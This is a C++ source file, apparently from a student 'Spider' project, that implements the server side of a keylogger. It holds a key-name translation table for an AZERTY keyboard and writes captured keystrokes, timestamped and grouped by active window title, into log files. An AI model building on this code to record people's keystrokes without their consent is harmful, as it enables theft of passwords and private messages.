//
// DumpFile.hh for includes in /home/bresci_b/rendu/Spider/server/src
//
// Made by bresci_b bresci_b
// Login   <bresci_b@epitech.net>
//
// Started on  Tue Oct 27 11:35:15 2015 bresci_b bresci_b
// Last update Tue Nov 07 11:13:43 2015 bresci_b bresci_b
//

#include "DumpFile.hh"

DumpFile::DumpFile()
{
  DEBUG_MSG("DumpFile created");
  _file = NULL;
  _name = "";

  _translate["A"] = "a"; _translate["B"] = "b"; _translate["C"] = "c"; _translate["D"] = "d"; _translate["E"] = "e";
  _translate["F"] = "f"; _translate["G"] = "g"; _translate["H"] = "h"; _translate["I"] = "i"; _translate["J"] = "j";
  _translate["K"] = "k"; _translate["L"] = "l"; _translate["M"] = "m"; _translate["N"] = "n"; _translate["O"] = "o";
  _translate["P"] = "p"; _translate["Q"] = "q"; _translate["R"] = "r"; _translate["S"] = "s"; _translate["T"] = "t";
  _translate["U"] = "u"; _translate["V"] = "v"; _translate["W"] = "w"; _translate["X"] = "x"; _translate["Y"] = "y";
  _translate["Z"] = "z"; _translate["[CTRL]"] = ""; _translate["[Right MENU]"] = "";
  _translate["[SHIFT]A"] = "A"; _translate["[SHIFT]B"] = "B"; _translate["[SHIFT]C"] = "C";
  _translate["[SHIFT]D"] = "D"; _translate["[SHIFT]E"] = "E"; _translate["[SHIFT]F"] = "F";
  _translate["[SHIFT]G"] = "G"; _translate["[SHIFT]H"] = "H"; _translate["[SHIFT]I"] = "I";
  _translate["[SHIFT]J"] = "J"; _translate["[SHIFT]K"] = "K"; _translate["[SHIFT]L"] = "L";
  _translate["[SHIFT]M"] = "M"; _translate["[SHIFT]N"] = "N"; _translate["[SHIFT]O"] = "O";
  _translate["[SHIFT]P"] = "P"; _translate["[SHIFT]Q"] = "Q"; _translate["[SHIFT]R"] = "R";
  _translate["[SHIFT]S"] = "S"; _translate["[SHIFT]T"] = "T"; _translate["[SHIFT]U"] = "U";
  _translate["[SHIFT]V"] = "V"; _translate["[SHIFT]W"] = "W"; _translate["[SHIFT]X"] = "X";
  _translate["[SHIFT]Y"] = "Y"; _translate["[SHIFT]Z"] = "Z"; _translate["[ENTER]"] = "\n";
  _translate["[SPACEBAR]"] = " "; _translate["[SHIFT][,]"] = "?"; _translate["[SHIFT]"] = "";
  _translate["1"] = "&"; _translate["2"] = "e"; _translate["3"] = "\""; _translate["4"] = "'";
  _translate["5"] = "("; _translate["6"] = "-"; _translate["7"] = "e"; _translate["8"] = "_";
  _translate["9"] = "c"; _translate["0"] = "a"; _translate["[[{]"] = "_"; _translate["[+]"] = "=";
  _translate["[SHIFT]1"] = "1"; _translate["[SHIFT]2"] = "2"; _translate["[SHIFT]3"] = "3"; _translate["[SHIFT]4"] = "4";
  _translate["[SHIFT]5"] = "5"; _translate["[SHIFT]6"] = "6"; _translate["[SHIFT]7"] = "7"; _translate["[SHIFT]8"] = "8";
  _translate["[SHIFT]9"] = "9"; _translate["[SHIFT]0"] = "0"; _translate["[SHIFT][[{]"] = "[petit o]"; _translate["[SHIFT][+]"] = "+";
  _translate["[Right MENU]"] = "[Alt Gr]"; _translate["[Left MENU]"] = "[Alt]";
  _translate["[Applications key (Natural keyboard)]"] = "[Menu]";
  _translate["[Right MENU]1"] = ""; _translate["[Right MENU]2"] = "~"; _translate["[Right MENU]3"] = "#"; _translate["[Right MENU]4"] = "{";
  _translate["[Right MENU]5"] = "["; _translate["[Right MENU]6"] = "|"; _translate["[Right MENU]7"] = "`"; _translate["[Right MENU]8"] = "\\";
  _translate["[Right MENU]9"] = ""; _translate["[Right MENU]0"] = "@"; _translate["[Right MENU][[{]"] = "]"; _translate["[Right MENU][+]"] = "}";
}

DumpFile::~DumpFile()
{
  DEBUG_MSG("DumpFile deleted");
  if (_file && _file->is_open())
    {
      *_file << "\n";
      _file->close();
      delete _file;
    }
  if (!_name.empty())
    _name.clear();
}

void		DumpFile::createFile(const std::string &str)
{
  std::string	file;

  _name = str;
  file = isDirectoryExist("Logs") ? "Logs/" : "";
  file += str;
  _file = new std::ofstream(file.c_str(), std::ofstream::out | std::ofstream::app);
}

bool		DumpFile::checkFileExist() const
{
  if (_file && _file->is_open())
    return true;
  return false;
}

std::string	DumpFile::getName() const
{
  return _name;
}

std::string	DumpFile::getTime(PaquetKeys *paquet) const
{
  boost::posix_time::ptime	time_paquet;
  std::string			time;

  if (!paquet)
    return "UnnownTime";
  time_paquet = boost::posix_time::from_time_t(paquet->getDate());
  time = boost::posix_time::to_simple_string(time_paquet).c_str();
  return !time.empty() ? boost::replace_all_copy(time, " ", "-") : "UnknownTime";
}

bool		DumpFile::isDirectoryExist(const std::string &dir) const
{
  return boost::filesystem::is_directory(dir.c_str());
}

bool		DumpFile::writePaquet(PaquetKeys *paquet)
{
  static std::string	active = "";
  std::string	text = "";
  char		*tmpText = 0;
  char		*tmpActive = 0;

  if (!paquet)
    return false;
  tmpActive = paquet->getActive();
  tmpText = paquet->getTextDecoded();
  if (checkFileExist() && tmpText)
    {
      if (!boost::equals(active, tmpActive)) {
	active = tmpActive;
	*_file << std::endl << getTime(paquet) << " " << "[" << active << "]" << std::endl << std::endl;
      }
      text = tmpText;
      auto translate = _translate.find(text);
      if (translate != _translate.end()) {
	text = translate->second;
      }
      *_file << text << std::flush;
      return true;
    }
  return false;
}
